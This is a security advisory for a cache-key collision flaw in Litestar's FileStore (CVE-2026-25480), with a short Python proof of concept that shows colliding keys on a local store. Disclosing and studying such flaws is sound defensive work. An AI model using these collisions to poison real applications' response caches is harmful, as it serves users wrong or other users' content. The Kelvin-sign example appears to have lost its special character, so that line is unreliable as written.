# [M] Litestar's FileStore key canonicalization collisions allow response cache mixup/poisoning (ASCII ord + Unicode NFKD)

## Summary
Severity: Medium
Advisory: GHSA-vxqx-rh46-q2pg
CVE: CVE-2026-25480
CWE: CWE-176, CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-vxqx-rh46-q2pg
Type: github-advisory

## Affected
- PyPI: `litestar` — affected >=2.19.0 <2.20.0

## Details
### Summary
FileStore maps cache keys to filenames using Unicode NFKD normalization and ord() substitution without separators, creating key collisions. When FileStore is used as response-cache backend, an unauthenticated remote attacker can trigger cache key collisions via crafted paths, causing one URL to serve cached responses of another (cache poisoning/mixup)

### Details
litestar.stores.file._safe_file_name() normalizes input with unicodedata.normalize("NFKD", name) and builds the filename by concatenating c if alphanumeric else str(ord(c)) (no delimiter).
This transformation is not injective, e.g.:

- "k-" and "k45" both become "k45" (because - ord('-') == 45)
- "k/\n" becomes "k4710", colliding with "k4710"
- "K" (Kelvin sign) normalizes to "K", colliding with "K"

When used in response caching, the default cache key includes request path and sorted query params, which are attacker-controlled.

### PoC

```
import asyncio, tempfile
from litestar.stores.file import FileStore

async def main():
    d = tempfile.mkdtemp(prefix="ls_filestore_poc_")
    store = FileStore(d, create_directories=True)
    await store.__aenter__()

    # 1) ASCII ord-collision: "-" -> 45
    await store.set("k-", b"A")
    v = await store.get("k45")
    print("k-  ->", v)
    print("k45 ->", await store.get("k45"))
    if v == b"A":
        print("VULNERABLE: 'k-' collides with 'k45'")

    # 2) NFKD collision: Kelvin sign -> K
    await store.set("K", b"B")   # U+212A
    v2 = await store.get("K")
    print("K ->", await store.get("K"))
    print("K ->", v2)
    if v2 == b"B":
        print("VULNERABLE: 'K' collides with 'K' (NFKD)")

if __name__ == "__main__":
    asyncio.run(main())
```

### Impact
Vulnerability type: cache poisoning / cache key collision.
Impacted deployments: applications using Litestar response caching with FileStore backend (or any attacker-influenced keying into FileStore).
Possible impact: serving incorrect cached content across distinct URLs, potential confidentiality/integrity issues depending on what endpoints are cached.

## References
- https://github.com/litestar-org/litestar/security/advisories/GHSA-vxqx-rh46-q2pg
- https://nvd.nist.gov/vuln/detail/CVE-2026-25480
- https://github.com/litestar-org/litestar/commit/85db6183a76f8a6b3fd6ee3c88d860b9f37a2cca
- https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0
- https://github.com/litestar-org/litestar
- https://github.com/litestar-org/litestar/releases/tag/v2.20.0
